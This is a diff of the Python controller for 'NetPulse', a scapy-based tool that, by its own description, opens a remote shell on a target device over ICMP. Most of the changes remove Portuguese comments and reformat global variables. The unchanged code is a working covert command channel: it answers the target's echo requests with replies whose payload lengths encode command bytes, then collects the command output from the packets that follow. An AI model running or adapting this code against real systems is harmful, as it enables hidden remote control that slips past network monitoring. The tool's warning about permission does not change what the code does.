@@ -9,19 +9,17 @@ import threading
 from scapy.all import sniff, Packet, ICMP, Ether, IP, sendp
 from typing import Any
 
-__version__ = "0.0.1"
+shell          = "\033[1;92m%target ❯\033[0m  "
 
-# Inicializando váriaveis globais
-# com valores padrão
-shell = " \033[1;92m%target ❯\033[0m  "
-payload = [0]
-args = None
-message = ""
-payload_index = 0
-listening = False
-sending = False
-establish = False
-event = threading.Event()
+__version__    = "0.0.1"
+payload        = [0]
+args           = None
+message        = ""
+payload_index  = 0
+listening      = False
+sending        = False
+establish      = False
+event          = threading.Event()
 
 
 def f_padding(padding: str, code: int) -> str:
@@ -30,14 +28,9 @@ def f_padding(padding: str, code: int) -> str:
     A função repete ou reduzi a string `padding` para ficar
     com a quantidade de caracteres exato de `code`.
     """
-    # verifica se code é maior ou igual a
-    # padding para então aumentar ou manter
-    # a quantidade de caracteres da string
     if code >= len(padding):
         r_padding = padding * ((code // len(padding)) + 1)
         return r_padding[:code]
-    # caso padding seja menor que code
-    # irá reduzir a string
     else:
         return padding[:code]
 
@@ -55,45 +48,27 @@ def process_command(bytes: str) -> str:
     global message
     global establish
 
-    # caso não haja bytes para serem enviados
-    # a função irá retornar uma string vázia
     if len(bytes) == 0:
         return ""
 
     payload_index = 0
 
     if args.verification:
-        # pega o hash SHA1 do comando
         hash_res = hashlib.sha1(bytes.encode(args.decode)).hexdigest()
     else:
-        # caso a verificação checksum esteja desativa
-        # envia um '#' para simbolizar que não foi feito
-        # a verificação checksum para o alvo
-        hash_res = "#"
+        hash_res = "#" # "#" = WITHOUT CHECKSUM
 
-    # a conexão já foi estabelecida?
     if not establish:
-        # o primeiro byte do payload é zero
-        # isso faz com que o primeiro pacote não tenha um payload
-        # assim o alvo pode usar o primeiro pacote para determinar
-        # qual a quantidade de bytes que representa o tamanho do payload
-        # e qual a outra parte insignificante
         payload = [0]
         establish = True
     else:
         payload = []
 
-    # bytes a serem enviados
-    # formato: <checksum>:<comando>
     bytes = f"{hash_res}:{bytes}"
 
-    # percorre todos os bytes e transforma em números inteiros
-    # e então adiciona a lista `payload`
     for byte in bytes:
         payload.append(ord(byte))
 
-    # adiciona um zero ao final para dizer ao alvo
-    # que a transmissão de bytes acabou
     payload.append(0)
 
     sending = True
@@ -102,13 +77,9 @@ def process_command(bytes: str) -> str:
 
     while sending or listening:
         try:
-            # está transmitindo dados para o alvo?
             if sending:
-                # calcula a porcentagem de dados que foram enviados
                 p = (payload_index // payload_len) * 100
 
-                # se zero, simboliza que o alvo ainda não enviou
-                # um ICMP request para inicializar a troca de dados
                 if p == 0:
                     print("\r* Waiting for a target request...", end="")
                 else:
@@ -122,10 +93,6 @@ def process_command(bytes: str) -> str:
                     end="",
                 )
         except KeyboardInterrupt:
-            # caso aconteça uma interrupção de teclado
-            # o recebido de dados acaba
-            # obs: o alvo ainda continuará enviando dados
-            # porém eles não serão mais capturados
             listening = False
             return message
 
@@ -136,12 +103,9 @@ def process_command(bytes: str) -> str:
     checksum = message[0]
     content = ":".join(message[1:])
 
-    # verifica se a flag -n não foi usada e
-    # se o checksum retornada pelo alvo não foi uma '#'
     if args.verification and checksum != "#":
         content_hash = hashlib.sha1(content.encode(args.decode)).hexdigest()
         if content_hash != checksum:
-            # imprime um erro caso a verificação checksum falhe
             print(
                 "\033[1;91m[NETPULSE MESSAGE] SHA1 checksum failed, indicating potential corruption in the command output.\033[0m",
                 file=sys.stderr,
@@ -164,24 +128,16 @@ def connection(packet: Packet) -> None:
     global payload
     global sending
 
-    # verifica se o programa está em um processo de recebimento ou de envio de dados
-    # também fazem outras verificações para garantir que o pacote é um ICMP echo request
     if (listening or sending) and (ICMP in packet) and (packet[ICMP].type == 8):
         id_ = packet[ICMP].id
         seq = packet[ICMP].seq
 
-        # está captando dados?
         if listening:
             try:
-                # adiciona o payload do pacote recibido a `message`
                 message += packet[ICMP].load.decode(args.decode)
             except AttributeError:
-                # caso aconteça um AttributeError, provavelmente o pacote
-                # enviado não continha um payload, isso significa que o
-                # alvo terminou de enviar os dados necessários
                 listening = False
 
-            # envia um ICMP echo reply
             sendp(
                 (
                     Ether(src=packet[Ether].dst, dst=packet[Ether].src)
@@ -196,9 +152,6 @@ def connection(packet: Packet) -> None:
 
         code = payload[payload_index]
 
-        # envia um pacote ICMP echo reply contendo
-        # um payload do tamanho do código decimal
-        # que será convertido pelo alvo
         echo_reply = (
             Ether(src=packet[Ether].dst, dst=packet[Ether].src)
             / IP(src=packet[IP].dst, dst=packet[IP].src)
@@ -208,8 +161,6 @@ def connection(packet: Packet) -> None:
 
         sendp(echo_reply, count=1, iface=args.iface, verbose=False)
 
-        # caso o código seja igual a zero e não seja o byte inicial
-        # isso significa que o envio de dados terminou
         if code == 0 and payload_index != 0:
             listening = True
             sending = False
@@ -237,7 +188,6 @@ NetPulse v{__version__} - github.com/thekh49s/netpulse
         epilog="NetPulse is a script that allows you to establish a remote shell\non a target device using the ICMP protocol. Use it responsibly and\nwith proper permission, as misuse may be considered illegal.",
         formatter_class=argparse.RawDescriptionHelpFormatter,
     )
-    # cria um grupo para opções vázio
     options = parser.add_argument_group()
 
     options.add_argument("-h", action="help", help="show this help message and exit")
@@ -316,8 +266,6 @@ def _sniff(event: threading.Event) -> None:
             stop_filter=lambda x: event.is_set(),
         )
     except PermissionError:
-        # caso aconteça um erro de permissão negada
-        # imprime uma mensagem e tenta parar o evento
         event.is_set()
         print("[ERROR] Insufficient permissions. Try as root!")
         return
@@ -360,7 +308,6 @@ def main() -> int:
     global args
     global shell
 
-    # pega os argumentos do analisador
     parser = create_main_parser()
     args = parser.parse_args()
 
@@ -376,48 +323,31 @@ def main() -> int:
         return 1
 
     try:
-        # verifica se o endereço fornecido é válido
-        # e faz tradução DNS
         target = socket.gethostbyname(args.target)
     except socket.gaierror:
         print(f"[ERROR] Please verify that the target ({args.target}) is correct.")
         return 1
 
-    # cria o thread para o sniffer
     sniff_thread = threading.Thread(target=_sniff, args=(event,))
 
-    # inicializa o thread
     sniff_thread.start()
 
-    # verifica se a flag -c está sendo usada
-    # caso sim, executa o comando e encerra o programa
     if args.command is not None:
-        # seta establish igual a True
-        # OBS: NÃO SE DEVE USAR ESSA OPÇÃO
-        # SE NÃO HOUVE UMA INTERAÇÃO COM
-        # O ALVO ANTES
         establish = True
         print(process_command(args.command))
 
-        # encerra o evento do sniffer e retorna
-        # o código de saída = 0
         event.set()
         return 0
 
     while True:
         try:
-            # input para processar os comandos
             output = process_command(input(shell.replace("%target", args.target)))
 
-            # imprime a saída caso ela tenha um tamanho
-            # diferente de zero
             if len(output):
                 print(output)
 
         except KeyboardInterrupt:
             print("\n\033[1;93mQuitting...\033[0m")
-
-            # tenta parar o evento do sniffer
             event.set()
 
             return 0
